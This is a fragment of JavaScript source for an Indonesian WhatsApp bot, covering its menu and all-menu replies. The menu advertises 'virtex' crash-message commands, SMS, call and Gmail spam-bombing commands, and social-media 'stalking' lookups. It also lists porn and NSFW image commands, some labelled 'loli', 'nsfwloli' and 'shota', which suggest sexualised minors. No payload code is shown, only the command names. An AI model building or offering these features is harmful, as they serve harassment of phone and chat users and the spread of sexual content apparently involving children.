# *!anime* that is for stalk anime *send command !anime continues anime title*







# *!pinterest*, which is to help you find images *send a command! further pinterest with the image you are looking for*







# *!write/nulis* that is to help you write something in the form of a photo *send a command !write further with the text to be written*







# *!alquran*, which is to see the contents of the letter you are looking for and its meaning *send orders!Alquran is continued with the verse and surah you are looking for* 







*Please try other features that have been provided by the bot*







*Warning* 



-no calls/vc bots 



-no spam bots/pause 5 seconds 



-not allowed to enter bots in any group (owner's permission) 



-Do not use adult features for children under 18 years old -use bots wisely 







*be a good user and obey the rules* 



You can see other menus for yourself by typing !command`



 reply(tutor1)



 break



 case "astetick":



 case "videoanime":



 case "storyanime2":



 reply(mess.wait)



 Iki = await getBuffer (`https://megayaa.herokuapp.com/api/randomaesthetic`)



 wann.sendMessage(from, Iki, video, {quoted: freply, thumbnail: fakeimage })



 break



 case 'menu':

 thu = await wann.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)

 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})
              reply('𝒯𝓊𝓃ℊℊ𝓊 𝒮ℯ𝒷ℯ𝓃𝓉𝒶𝓇 𝒦𝒶𝓀....')
  groups = wann.chats.array.filter(v => v.jid.endsWith('g.us'))

privat = wann.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))

ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`

charger = `${charging ? 'lagi dicas' : 'ga dicas'}`

uptime = process.uptime();

timestampe = speed();

totalChat = await wann.chats.all()

latensie = speed() - timestampe

total = math(`${groups.length}*${privat.length}`)



menu =`${botName}
 ${ucapanWaktu} ${pushname} 👋
 Selamat Datang Di Menu InviBotz 
Silahkan Pilih Orderan Yang Mau Dipesan😇

👤 YOUR INFORMATION
▹ Username: *${pushname}*

▹ Sender : *@${sender.split('@')[0]}*

▹ Bio Info : *${thu.status}*

▹ Premium : *${isPremium ? 'Ya' : 'No'}*

▹ Admin : *${isGroupAdmins ? 'Ya' : 'No'}*

▹ Level : *${Levelnye}*

▹ XP : *${Xpluu} / ${requiredXplu}*
Flw: instagram.com/achyrr_wann/ `

wann.sendMessage(from, { contentText: `${menu}`, footerText: `🐣 Day : ${week} ${weton}\n🐥 Date : ${date}`,buttons: [{ buttonId: noprefix ? "command" : "!"+"command", buttonText: { displayText: 'LIST MESSAGE' }, type: 1 },{ buttonId: noprefix ? "sewabot" : "!"+"sewabot", buttonText: { displayText: '🏷️ RENT A BOT' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')

break
case 'allmenu':


menu =` Hai Kak ${pushname} Ini Adalah All Menu Bot Silahkan Dipilih Ya
͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏
| Runtime : *${runtime(process.uptime())}*
| Speed : *${latensie.toFixed(4)} _Second_*
| *Name* : *${pushname}*
| *Your API : *https://wa.me/${sender.split('@')[0]}*
€â€ã€Œ *Wann Bot* 

â Commands :

â Group Commands
| ${prefix}setppgrup _replyImage_
| ${prefix}setgrupname _text_
| ${prefix}setdesc _text_
| ${prefix}hidetag _text_
| ${prefix}promote _@tag_
| ${prefix}demote _@tag_
| ${prefix}kick _@tag_
| ${prefix}add _number_
| ${prefix}revoke
| ${prefix}linkgc
| ${prefix}afk
| ${prefix}tagme
| ${prefix}infogrup
| ${prefix}voting
| ${prefix}delvote
| ${prefix}leave
| ${prefix}tutuptime
| ${prefix}bukatime

â DETECTOR SYSTEM 
| ${prefix}welcome (enable/disable)
| ${prefix}group (enable/disable)
| ${prefix}nobadword (enable/disable)
| ${prefix}leveling (enable/disable)
| ${prefix}antidelete (enable/disable)
| ${prefix}antilinkgroup (1/0)

â ANTI VIRUS GROUP 
| ${prefix}antivirus1 (a/b)
| ${prefix}antivirus2 (a/b)
| ${prefix}antivirus3 (a/b)
| ${prefix}antivirus4 (a/b)
| ${prefix}antivirus5 (a/b) 
| ${prefix}antivirus6 (a/b)
| ${prefix}antivirus7 (a/b)

â VIRUS VIRTEX 
| ${prefix}virtex-ngazap
| ${prefix}virtex-emoji2
| ${prefix}virtex-virtex
| ${prefix}virtex-virtex2
| ${prefix}virtex-virtex3
| ${prefix}virtex-virtex4
| ${prefix}virtex-virtex5
| ${prefix}virtex-virtex6
| ${prefix}virtex-virtex7
| ${prefix}virtex-virtex8
| ${prefix}virtex-virtex9
| ${prefix}virtex-virtag

â Sticker Commands 
| ${prefix}dadu
| ${prefix}toimg
| ${prefix}doge
| ${prefix}bucinstick
| ${prefix}patrick
| ${prefix}stickeranime
| ${prefix}sticker reply foto/video
| ${prefix}ttg teks
| ${prefix}take pack|author
| ${prefix}swm pack|author
| ${prefix}smeme teks|teks 

â Creator Commands 
| ${prefix}attp teks
| ${prefix}ttp1 text
| ${prefix}ttp2 text
| ${prefix}ttp3 text
| ${prefix}ttp4 text
| ${prefix}attp text 
| ${prefix}tg text
| ${prefix}semoji emoji
| ${prefix}emojitoimg emoji
| ${prefix}ytkomen text
| ${prefix}phkomen text
| ${prefix}amongus text
| ${prefix}tolol text
| ${prefix}fakedonald tex
| ${prefix}quotemaker text
| ${prefix}ktpmaker text
| ${prefix}qrcode text

â Random Video Commands
| ${prefix}lolivid
| ${prefix}storyanime
| ${prefix}storyanime2
| ${prefix}storyanime3
| ${prefix}astetick

â Asupan Commands
| ${prefix}asupan
| ${prefix}asupan1
| ${prefix}asupan2
| ${prefix}asupan3
| ${prefix}asupan4
| ${prefix}asupan5
| ${prefix}asupan6
| ${prefix}+62
| ${prefix}santuy
| ${prefix}ukty
| ${prefix}bocil
| ${prefix}ghea
| ${prefix}rika

â Game Commands
| ${prefix}slot
| ${prefix}limitgame
| ${prefix}gelud @tag
| ${prefix}tictactoe @tag
| ${prefix}family100
| ${prefix}kuismath
| ${prefix}asahotak
| ${prefix}tebaklirik
| ${prefix}tebaklagu
| ${prefix}tebakkata
| ${prefix}susunkata
| ${prefix}kimiakuis
| ${prefix}caklontong
| ${prefix}tebakjenaka
| ${prefix}tebakanime
| ${prefix}tebaktebakan
| ${prefix}tebakgambar
| ${prefix}tebakbendera
| ${prefix}suit *batu/kertas/gunting*

â Islam Commands
| ${prefix}asmaulhusna
| ${prefix}kisahnabi
| ${prefix}alkitabharian
| ${prefix}jadwalsholat
| ${prefix}listsurah
| ${prefix}quran
| ${prefix}al-fatihah
| ${prefix}al-baqarah
| ${prefix}al-imran
| ${prefix}an-nisa
| ${prefix}al-maidah 
| ${prefix}al-anam
| ${prefix}al-araf
| ${prefix}al-anfal
| ${prefix}at-taubah
| ${prefix}yunus
| ${prefix}hud
| ${prefix}yusuf
| ${prefix}ar-raad
| ${prefix}ibrahim
| ${prefix}al-hijr
| ${prefix}an-nahl
| ${prefix}al-isra
| ${prefix}al-kahfi
| ${prefix}maryam
| ${prefix}al-anbiya
| ${prefix}at-takasur
| ${prefix}al-ashr
| ${prefix}al-humazah
| ${prefix}al-fil
| ${prefix}al-maun
| ${prefix}quraisy
| ${prefix}al-kausar
| ${prefix}al-kafirun
| ${prefix}al-lahab
| ${prefix}al-ikhlas
| ${prefix}an-nas
| ${prefix}an-nashr

â Sound Jedag Jedug ðŸ”Š Command
| ${prefix}pale
| ${prefix}sound
| ${prefix}sound1
| ${prefix}sound2
| ${prefix}sound3
| ${prefix}sound4
| ${prefix}sound5
| ${prefix}sound6
| ${prefix}sound7
| ${prefix}sound8
| ${prefix}sound9
| ${prefix}sound10
| ${prefix}sound11
| ${prefix}sound12
| ${prefix}sound13
| ${prefix}sound14
| ${prefix}sound15
| ${prefix}sound16
| ${prefix}sound17
| ${prefix}sound18
| ${prefix}sound19
| ${prefix}sound20
| ${prefix}sound21
| ${prefix}sound22
| ${prefix}sound23
| ${prefix}sound24
| ${prefix}sound25
| ${prefix}sound26
| ${prefix}sound26
| ${prefix}sound27
| ${prefix}sound28

â Sound Islam Commands
| ${prefix}ayatkursi2
| ${prefix}tilawah
| ${prefix}sholawatnabi
| ${prefix}ngaji
| ${prefix}ngaji2

â Sound Musik ðŸŽ§ Commands
| ${prefix}sad
| ${prefix}sad2
| ${prefix}sad3
| ${prefix}sad4
| ${prefix}aeshtetic
| ${prefix}aeshtetic2
| ${prefix}aeshtetic3
| ${prefix}aeshtetic4
| ${prefix}home
| ${prefix}gettingold
| ${prefix}allnight
| ${prefix}lucas
| ${prefix}wanna
| ${prefix}yourskin
| ${prefix}up
| ${prefix}cutmeoff
| ${prefix}beautiful
| ${prefix}loosinggame
| ${prefix}playdate
| ${prefix}loosinginterest

â Convert Commands
| ${prefix}tomp3 [ _reply video_ ]
| ${prefix}tomp4 [ _reply sticker gif_ ]
| ${prefix}kencengin [ _reply audio caption angka_ ]
| ${prefix}cepetin [ _reply audio caption angka_ ]
| ${prefix}detikvideo [ _reply audio caption angka_ ]
| ${prefix}detikvn [ _reply audio caption angka_ ]
| ${prefix}volume [ _reply audio caption angka_ ]
| ${prefix}balikin [ _reply audio_ ]
| ${prefix}imut [ _reply audio_ ]
| ${prefix}robot [ _reply audio_ ]
| ${prefix}vntobase64 [ _reply audio_ ]
| ${prefix}slow [ _reply audio_ ]
| ${prefix}hode [ _reply audio_ ]
| ${prefix}gemuk [ _reply audio_ ]
| ${prefix}nightcore [ _reply audio_ ]
| ${prefix}blub [ _reply audio_ ]

â Audio Commands
| ${prefix}audio
| ${prefix}audio1
| ${prefix}audio2
| ${prefix}audio3
| ${prefix}audio4
| ${prefix}audio5
| ${prefix}audio7
| ${prefix}audio8
| ${prefix}audio9
| ${prefix}audio10

â Pray Commands
| ${prefix}play query
| ${prefix}play2 query
| ${prefix}play3 query
| ${prefix}tebakjenaka
| ${prefix}jooxplay query
| ${prefix}lagu query
| ${prefix}tebakgambar
| ${prefix}tebakbendera
| ${prefix}suit *batu/kertas/gunting*

â Downloader Commands
| ${prefix}fb url_video
| ${prefix}ig url_video
| ${prefix}twitter url_video
| ${prefix}ythd url_video
| ${prefix}ytmp3 url_video
| ${prefix}ytmp4 url_video 
| ${prefix}tiktok url_video
| ${prefix}tiktoknowm url_video
| ${prefix}tiktokaudio url_video
| ${prefix}wattpadsearch query
| ${prefix}spotifysearch query
| ${prefix}spotify url_video
| ${prefix}mediafire url 
| ${prefix}xhamstersearch query
| ${prefix}xhamster url_video
| ${prefix}xnxxsearch query
| ${prefix}xnxx url_video
| ${prefix}soundcloud
| ${prefix}nhentaipdf *code*

â Story & Movie Commands
| ${prefix}lk21 query
| ${prefix}wattpad url_wattpad
| ${prefix}wattpadsearch query
| ${prefix}cersexsearch
| ${prefix}cersex
| ${prefix}cersex1
| ${prefix}cerpen
| ${prefix}ceritahoror
| ${prefix}ceritasex
| ${prefix}ceritapendek
| ${prefix}film *query*
| ${prefix}film2 *query*
| ${prefix}searchfilm *query*
| ${prefix}filmapikterbaru *query*
| ${prefix}filmapikdrama *query*
| ${prefix}drakorongoing

â Searching Commands
| ${prefix}shopee query
| ${prefix}google query
| ${prefix}gimage query
| ${prefix}gimage2 query
| ${prefix}jadian2 
| ${prefix}konachan query
| ${prefix}playstore query
| ${prefix}stickerwa query
| ${prefix}wallpapersearch query
| ${prefix}wallpapersearch2 query

â Stalking Commands
| ${prefix}ytstalk *ussername*
| ${prefix}tkstalk *ussername*
| ${prefix}githubstalk *ussername*
| ${prefix}igstalk *ussername*
| ${prefix}twtstalk *ussername* 
| ${prefix}apikeycek *ussername*


â Random Text Commands
| ${prefix}quotes
| ${prefix}quotesyt
| ${prefix}quotesnasehat
| ${prefix}quotesmotivasi
| ${prefix}quotesdiLan
| ${prefix}quotesanime 
| ${prefix}quotesimage
| ${prefix}faktaunik
| ${prefix}katabijak
| ${prefix}pantun
| ${prefix}bucin
| ${prefix}randomnama

â Primbon Commands
| ${prefix}artinama name
| ${prefix}jodoh name1 & name2 
| ${prefix}weton tanggal bulan tahun
| ${prefix}jadian tanggal bulan tahun
| ${prefix}jadian2 
| ${prefix}tebakumur name
| ${prefix}tebakgender name 
| ${prefix}zodiak

â Fun Commands
| ${prefix}darkjoke
| ${prefix}meme
| ${prefix}citacita
| ${prefix}truthdare
| ${prefix}truth
| ${prefix}toxic
| ${prefix}dare
| ${prefix}waktu
| ${prefix}togel

â kerang Commands
| ${prefix}watak
| ${prefix}apakah
| ${prefix}bisakah
| ${prefix}kapankah
| ${prefix}rate
| ${prefix}jadian
| ${prefix}cantik
| ${prefix}ganteng
| ${prefix}beban
| ${prefix}babi
| ${prefix}wangy
| ${prefix}cekwatak
| ${prefix}cekganteng
| ${prefix}cekcantik
| ${prefix}cekmati

â Image Manipulation Commands
| ${prefix}hackereffect
| ${prefix}rip
| ${prefix}wasted1
| ${prefix}glass
| ${prefix}joke
| ${prefix}wasted
| ${prefix}hitler
| ${prefix}wanted
| ${prefix}greyscale
| ${prefix}trash
| ${prefix}circle
| ${prefix}blur
| ${prefix}tinyurl
| ${prefix}picture
| ${prefix}cuttly
| ${prefix}affect

â Anime  Commands
| ${prefix}itsuki
| ${prefix}nino
| ${prefix}yotsuba
| ${prefix}naruto
| ${prefix}mikasa
| ${prefix}eren
| ${prefix}titan
| ${prefix}levi
| ${prefix}sakura
| ${prefix}hinata
| ${prefix}minato
| ${prefix}jiraya
| ${prefix}tsunade
| ${prefix}kiba
| ${prefix}armin
| ${prefix}bertholdt
| ${prefix}erwin
| ${prefix}reiner
| ${prefix}annie
| ${prefix}hanji
| ${prefix}jean
| ${prefix}connie
| ${prefix}historia
| ${prefix}sasha
| ${prefix}boruto
| ${prefix}sarada
| ${prefix}sasuke
| ${prefix}madara
| ${prefix}obito
| ${prefix}kanao
| ${prefix}sayu
| ${prefix}yoshida
| ${prefix}airi
| ${prefix}asami
| ${prefix}yuzuha
| ${prefix}hashimoto
| ${prefix}tanLarasCans
| ${prefix}nezuko
| ${prefix}ichika
| ${prefix}luffy
| ${prefix}zenitsu
| ${prefix}giyu
| ${prefix}sakonji
| ${prefix}inosuke
| ${prefix}zoro
| ${prefix}sanji
| ${prefix}sagiri
| ${prefix}killua
| ${prefix}taiko
| ${prefix}natsu
| ${prefix}genos
| ${prefix}saitama
| ${prefix}miku

â Wibu  Commands
| ${prefix}ppcouple
| ${prefix}loli
| ${prefix}husbu
| ${prefix}milf
| ${prefix}cosplay
| ${prefix}wallml
| ${prefix}manga
| ${prefix}doge
| ${prefix}anime
| ${prefix}lolivideo
| ${prefix}husbu
| ${prefix}waifu
| ${prefix}neko
| ${prefix}kanna
| ${prefix}sagiri
| ${prefix}hentai
| ${prefix}cosplay
| ${prefix}wallnime
| ${prefix}kusonime
| ${prefix}megumin
| ${prefix}otakudesu
| ${prefix}doujindesu
| ${prefix}storyanime
| ${prefix}nakanomiku
| ${prefix}nakanoikyy
| ${prefix}nakanoitsuki
| ${prefix}nekopoisearch
| ${prefix}kodenuklir
| ${prefix}nhentai
| ${prefix}nekopoi 
| ${prefix}nekopoi3d 
| ${prefix}nekopoicosplay 

â AniManga Commands
| ${prefix}wait
| ${prefix}manga query
| ${prefix}anime query
| ${prefix}character query
| ${prefix}kusonime url_kusonime
| ${prefix}kusonimesearch query
| ${prefix}otakudesu url_otakudesu
| ${prefix}otakudesusearch query
| ${prefix}kodenuklir
| ${prefix}nhentai
| ${prefix}nhentai2 kode_bom
| ${prefix}nhentaipdf kode_bom
| ${prefix}nhentaisearch query
| ${prefix}nekopoi url
| ${prefix}nekopoisearch query

â Information Commands
| ${prefix}kbbi
| ${prefix}brainly2
| ${prefix}jarak
| ${prefix}urbandictionary
| ${prefix}jadwaltv channel
| ${prefix}jadwaltvnow
| ${prefix}jadwalbola
| ${prefix}qrreader
| ${prefix}heroml hero_name
| ${prefix}mlstalk id/server
| ${prefix}genshin character
| ${prefix}wikipedia query
| ${prefix}translate kode_negara text
| ${prefix}brainly query
| ${prefix}newsinfo
| ${prefix}cnnindonesia
| ${prefix}cnnnasional
| ${prefix}cnninternasional
| ${prefix}infogempa
| ${prefix}lirik query
| ${prefix}cuaca daerah
| ${prefix}kodepos query
| ${prefix}indbeasiswa
| ${prefix}hoax
| ${prefix}nsfwcheck
| ${prefix}ocr

â Other Commands
| ${prefix}ssweb link
| ${prefix}ssweb2 link
| ${prefix}shortlink link
| ${prefix}spamsms nomor
| ${prefix}spamcall
| ${prefix}spamgmail
| ${prefix}spam

â Text Pro Me Commands
| ${prefix}blackpink text
| ${prefix}neon text
| ${prefix}greenneon text
| ${prefix}advanceglow text
| ${prefix}futureneon text
| ${prefix}sandwriting text
| ${prefix}sandsummer text
| ${prefix}sandengraved text
| ${prefix}metaldark text
| ${prefix}neonlight text
| ${prefix}holographic text
| ${prefix}text1917 text
| ${prefix}minion text
| ${prefix}deluxesilver text
| ${prefix}newyearcard text
| ${prefix}bloodfrosted text
| ${prefix}halloween text
| ${prefix}jokerlogo text
| ${prefix}fireworksparkle text
| ${prefix}natureleaves text
| ${prefix}bokeh text
| ${prefix}toxic text
| ${prefix}box3d text
| ${prefix}roadwarning text
| ${prefix}breakwall text
| ${prefix}icecold text
| ${prefix}luxury text
| ${prefix}cloud text
| ${prefix}summersand text
| ${prefix}horrorblood text
| ${prefix}thunder text
| ${prefix}pornhub text1 text2
| ${prefix}glitch text1 text2
| ${prefix}avenger text1 text2
| ${prefix}space text1 text2
| ${prefix}ninjalogo text1 text2
| ${prefix}marvelstudio text1 text2
| ${prefix}lionlogo text1 text2
| ${prefix}wolflogo text1 text2
| ${prefix}steel3d text1 text2
| ${prefix}wallgravity text1 text2

â Photo Oxy Commands
| ${prefix}shadow text
| ${prefix}cup text
| ${prefix}cup1 text
| ${prefix}romance text
| ${prefix}smoke text
| ${prefix}burnpaper text
| ${prefix}lovemessage text
| ${prefix}undergrass text
| ${prefix}love text
| ${prefix}coffe text
| ${prefix}woodheart text
| ${prefix}woodenboard text
| ${prefix}summer3d text
| ${prefix}wolfmetal text
| ${prefix}nature3d text
| ${prefix}underwater text
| ${prefix}golderrose text
| ${prefix}summernature text
| ${prefix}letterleaves text
| ${prefix}glowingneon text
| ${prefix}fallleaves text
| ${prefix}flamming text
| ${prefix}harrypotter text
| ${prefix}carvedwood text
| ${prefix}tiktok1 text1 text2
| ${prefix}arcade8bit text1 text2
| ${prefix}battlefield4 text1 text2
| ${prefix}pubg text1 text2

â Ephoto 360 Commands
| ${prefix}wetglass text
| ${prefix}multicolor3d text
| ${prefix}watercolor text
| ${prefix}luxurygold text
| ${prefix}galaxywallpaper text
| ${prefix}lighttext text
| ${prefix}beautifulflower text
| ${prefix}puppycute text
| ${prefix}royaltext text
| ${prefix}heartshaped text
| ${prefix}birthdaycake text
| ${prefix}galaxystyle text
| ${prefix}hologram3d text
| ${prefix}greenneon text
| ${prefix}glossychrome text
| ${prefix}greenbush text
| ${prefix}metallogo text
| ${prefix}noeltext text
| ${prefix}glittergold text
| ${prefix}textcake text
| ${prefix}starsnight text
| ${prefix}wooden3d text
| ${prefix}textbyname text
| ${prefix}writegalacy text
| ${prefix}galaxybat text
| ${prefix}snow3d text
| ${prefix}birthdayday text
| ${prefix}goldplaybutton text
| ${prefix}silverplaybutton text
| ${prefix}freefire text

â Random Image NSFW
| ${prefix}nsfwneko
| ${prefix}nsfwloli
| ${prefix}nsfwwaifu
| ${prefix}nsfweroyuri
| ${prefix}nsfwero
| ${prefix}art
| ${prefix}bts
| ${prefix}exo
| ${prefix}elf
| ${prefix}loli
| ${prefix}neko
| ${prefix}waifu
| ${prefix}shota
| ${prefix}husbu
| ${prefix}sagiri
| ${prefix}shinobu
| ${prefix}megumin
| ${prefix}wallnime
| ${prefix}chiisaihentai
| ${prefix}trap
| ${prefix}blowjob
| ${prefix}ecchi
| ${prefix}hentai
| ${prefix}ahegao
| ${prefix}hololewd
| ${prefix}sideoppai
| ${prefix}animefeets
| ${prefix}animebooty
| ${prefix}animethighss
| ${prefix}hentaiparadise
| ${prefix}animearmpits
| ${prefix}hentaifemdom
| ${prefix}lewdanimegirls
| ${prefix}biganimetiddies
| ${prefix}animebellybutton
| ${prefix}hentai4everyone
| ${prefix}bj
| ${prefix}ero
| ${prefix}cum
| ${prefix}feet
| ${prefix}yuri
| ${prefix}erok
| ${prefix}lewd
| ${prefix}feed
| ${prefix}eron
| ${prefix}solo
| ${prefix}gasm
| ${prefix}poke
| ${prefix}anal
| ${prefix}holo
| ${prefix}tits
| ${prefix}kuni
| ${prefix}kiss
| ${prefix}smug
| ${prefix}baka
| ${prefix}solog
| ${prefix}feetg
| ${prefix}lewdk
| ${prefix}waifu
| ${prefix}pussy
| ${prefix}femdom
| ${prefix}cuddle
| ${prefix}hentai
| ${prefix}eroyuri
| ${prefix}cum_jpg
| ${prefix}blowjob
| ${prefix}erofeet
| ${prefix}holoero
| ${prefix}fox_girl
| ${prefix}futanari
| ${prefix}lewdkemo
| ${prefix}wallpaper
| ${prefix}pussy_jpg
| ${prefix}kemonomimi
| ${prefix}nsfw_avatar
| ${prefix}ngif
| ${prefix}nsfw_neko_gif
| ${prefix}eroyuri
| ${prefix}random_hentai_gif

â Porn  Commands
| ${prefix}bkp *random*
| ${prefix}bokep1
| ${prefix}bokep2
| ${prefix}bokep3
| ${prefix}bokep4
| ${prefix}bokep5
| ${prefix}bokep6
| ${prefix}bokep6
| ${prefix}bokep7
| ${prefix}bokep8
| ${prefix}bokep9
| ${prefix}bokep10
| ${prefix}bokep11
| ${prefix}bokep12
| ${prefix}bokep13
| ${prefix}bokep14
| ${prefix}bokep15
| ${prefix}bokep16
| ${prefix}bokep17
| ${prefix}bokep18
| ${prefix}bokep19
| ${prefix}bokep20
| ${prefix}bokep21
| ${prefix}bokep22
| ${prefix}bokep23
| ${prefix}bokep24
| ${prefix}bokep25
| ${prefix}bokep26
| ${prefix}bokep27
| ${prefix}bokep28
| ${prefix}bokep29
| ${prefix}bokep30
| ${prefix}bokep31
| ${prefix}bokep32
| ${prefix}bokep33
| ${prefix}bokep34
| ${prefix}bokep35
| ${prefix}bokep36
| ${prefix}bokep37
| ${prefix}bokep38
| ${prefix}bokep39
| ${prefix}bokep40
| ${prefix}bokep41
| ${prefix}bokep42
| ${prefix}bokep43
| ${prefix}bokep44
| ${prefix}bokep45
| ${prefix}bokep46
| ${prefix}bokep47
| ${prefix}bokep48
| ${prefix}bokep49
| ${prefix}bokep50
| ${prefix}bokep51
| ${prefix}bokep52
| ${prefix}bokep53
| ${prefix}bokep54
| ${prefix}bokep55
| ${prefix}bokep56
| ${prefix}bokep57
| ${prefix}bokep58
| ${prefix}bokep59
| ${prefix}bokep60
| ${prefix}bokep61
| ${prefix}bokep62
| ${prefix}bokep63
| ${prefix}bokep64
| ${prefix}bokep65
| ${prefix}bokep66
| ${prefix}bokep67
| ${prefix}bokep68
| ${prefix}bokep69
| ${prefix}bokep70
| ${prefix}bokep71
| ${prefix}bokep72
| ${prefix}bokep73
| ${prefix}bokep74
| ${prefix}bokep75
| ${prefix}bokep76
| ${prefix}bokep77
| ${prefix}bokep78
| ${prefix}bokep79
| ${prefix}bokep80
| ${prefix}bokep81
| ${prefix}bokep82
| ${prefix}bokep83
| ${prefix}bokep84
| ${prefix}bokep85
| ${prefix}bokep86
| ${prefix}bokep87
| ${prefix}bokep88
| ${prefix}bokep89
| ${prefix}bokep90
| ${prefix}bokep91
| ${prefix}bokep92
| ${prefix}bokep93
| ${prefix}bokep94
| ${prefix}bokep95
| ${prefix}bokep96
| ${prefix}bokep97
| ${prefix}bokep98
| ${prefix}bokep99
| ${prefix}bokep100
| ${prefix}bokep101
| ${prefix}bokep102
| ${prefix}bokep103
| ${prefix}bokep104
| ${prefix}bokep105
| ${prefix}bokep106
| ${prefix}bokep107
| ${prefix}bokep108
| ${prefix}bokep109
| ${prefix}bokep110
| ${prefix}bokep111
| ${prefix}bokep112
| ${prefix}bokep113
| ${prefix}bokep114
| ${prefix}bokep115
| ${prefix}bokep116
| ${prefix}bokep117
| ${prefix}bokep118
| ${prefix}bokep119
| ${prefix}bokep120
| ${prefix}bokep121
| ${prefix}bokep122
| ${prefix}bokep123
| ${prefix}bokep124
| ${prefix}bokep125
| ${prefix}bokep126

